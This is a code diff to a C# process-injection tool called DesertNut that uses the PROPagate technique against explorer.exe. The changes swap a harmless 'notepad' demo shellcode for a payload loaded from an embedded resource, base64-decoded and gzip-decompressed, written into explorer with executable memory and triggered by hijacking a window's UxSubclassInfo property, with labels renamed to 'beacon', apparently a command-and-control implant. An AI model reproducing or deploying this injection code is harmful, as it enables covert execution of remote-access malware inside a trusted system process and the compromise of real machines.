@@ -4,13 +4,62 @@ using System.Text.RegularExpressions;
 using Console = Colorful.Console;
 using System.Drawing;
 using System.Runtime.InteropServices;
+using System.Reflection;
+using System.IO;
 
 namespace DesertNut
 {
     class Program
     {
+        public static string ExtractResource(string filename)
+        {
+            var assembly = Assembly.GetExecutingAssembly();
+            var resourceName = filename;
+
+            using (Stream stream = assembly.GetManifestResourceStream(resourceName))
+            using (StreamReader reader = new StreamReader(stream))
+            {
+                string result = reader.ReadToEnd();
+                return result;
+            }
+
+        }
+        private delegate IntPtr GetPebDelegate();
+
+        static byte[] Decompress(byte[] gzip)
+        {
+            using (System.IO.Compression.GZipStream stream = new System.IO.Compression.GZipStream(new System.IO.MemoryStream(gzip),
+                System.IO.Compression.CompressionMode.Decompress))
+            {
+                const int size = 4096;
+                byte[] buffer = new byte[size];
+                using (System.IO.MemoryStream memory = new System.IO.MemoryStream())
+                {
+                    int count = 0;
+                    do
+                    {
+                        count = stream.Read(buffer, 0, size);
+                        if (count > 0)
+                        {
+                            memory.Write(buffer, 0, count);
+                        }
+                    }
+                    while (count > 0);
+                    return memory.ToArray();
+                }
+            }
+        }
         public static void PROPPagate()
         {
+
+
+
+
+            string scode = ExtractResource("DesertNut.Resource.txt");
+            byte[] blob = Convert.FromBase64String(scode);
+            byte[] BSc = Decompress(blob);
+
+
             // Search for target subclass in explorer
             Console.WriteLine("[+] Searching for Subclass property..", Color.LightGreen);
             List<DesertNut_h.WndPropStruc> CallResult = DesertNut_h.EnumSubClassProps(false);
@@ -46,18 +95,18 @@ namespace DesertNut
 
             // Remote shellcode alloc
             Console.WriteLine("[+] Allocating remote shellcode..", Color.LightGreen);
-            IntPtr rScPointer = DesertNut_h.VirtualAllocEx(hProc, IntPtr.Zero, (uint)DesertNut_h.NotepadSc.Length, 0x3000, 0x40);
+            IntPtr rScPointer = DesertNut_h.VirtualAllocEx(hProc, IntPtr.Zero, (uint)BSc.Length, 0x3000, 0x40);
             if (rScPointer == IntPtr.Zero)
             {
                 Console.WriteLine("[!] Unable to allocate shellcode in remote process..", Color.Red);
                 return;
             } else
             {
-                Console.WriteLineFormatted("    {2} {15}{1} " + DesertNut_h.NotepadSc.Length, Color.White, DesertNut_h.iProperties);
+                Console.WriteLineFormatted("    {2} {15}{1} " + BSc.Length, Color.White, DesertNut_h.iProperties);
                 Console.WriteLineFormatted("    {2} {16}{1} " + "0x" + String.Format("{0:X}", (rScPointer).ToInt64()), Color.White, DesertNut_h.iProperties);
                 // Write the byte array
                 uint BytesWritten = 0;
-                Boolean WriteResult = DesertNut_h.WriteProcessMemory(hProc, rScPointer, DesertNut_h.NotepadSc, (uint)DesertNut_h.NotepadSc.Length, ref BytesWritten);
+                Boolean WriteResult = DesertNut_h.WriteProcessMemory(hProc, rScPointer, BSc, (uint)BSc.Length, ref BytesWritten);
                 if (!WriteResult)
                 {
                     Console.WriteLine("[!] Failed to write shellcode..", Color.Red);
@@ -107,7 +156,7 @@ namespace DesertNut
             Console.WriteLine("[+] Updating original UxSubclassInfo subclass procedure..", Color.LightGreen);
             DesertNut_h.SetProp(DesertNut_h.TargetSubclass.hChildWnd, "UxSubclassInfo", rHPointer);
             // Trigger shellcode execution
-            Console.WriteLine("[+] Trigger remote shellcode --> notepad..", Color.LightGreen);
+            Console.WriteLine("[+] Trigger remote shellcode --> beacon..", Color.LightGreen);
             DesertNut_h.PostMessage(DesertNut_h.TargetSubclass.hChildWnd, 0x10, IntPtr.Zero, IntPtr.Zero); // 0x10 = WM_CLOSE
                                                                                                            // Our custom shellcode is keyed on this!
             // We sleep 200ms to avoid winning a race against the callback
@@ -133,7 +182,7 @@ namespace DesertNut
             {
                 Console.WriteLine("[!] No arguments given..", Color.Red);
                 Console.WriteLine("    => -l(--ListSubclassWndProps)    List potentially injectable properties.", Color.LightGreen);
-                Console.WriteLine("    => -i(--Inject)                  Inject notepad shellcode into explorer.", Color.LightGreen);
+                Console.WriteLine("    => -i(--Inject)                  Inject beacon shellcode into explorer.", Color.LightGreen);
             }
             else
             {
